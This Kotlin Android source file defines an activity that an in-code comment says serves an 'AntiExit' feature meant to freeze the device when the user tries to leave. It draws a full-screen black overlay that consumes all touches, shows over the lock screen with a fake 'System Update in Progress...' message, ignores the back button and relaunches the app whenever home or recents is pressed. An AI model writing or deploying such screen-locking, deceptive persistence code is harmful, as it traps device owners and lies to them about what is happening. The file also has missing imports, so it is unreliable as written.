package com.xrc.app.persistence

import android.app.Activity
import android.graphics.Color
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView

/**
 * Full-screen overlay that blocks all user interaction.
 * Used by AntiExit to freeze the device when user tries to exit.
 */
class OverlayBlockerActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
        )
        window.setFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
        window.addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD)

        val layout = FrameLayout(this).apply {
            setBackgroundColor(Color.BLACK)
            setOnTouchListener { _, _ -> true } // Consume all touches
        }

        val textView = TextView(this).apply {
            text = "System Update in Progress..."
            setTextColor(Color.WHITE)
            textSize = 18f
            gravity = Gravity.CENTER
        }

        layout.addView(textView, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            gravity = Gravity.CENTER
        })

        setContentView(layout)

        // Override back press
        onBackPressedDispatcher.addCallback(this) {
            // Do nothing - block back press
        }
    }

    override fun onUserLeaveHint() {
        // User pressed home or recent apps - reopen activity
        super.onUserLeaveHint()
        val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        if (intent != null) {
            startActivity(intent)
        }
    }
}
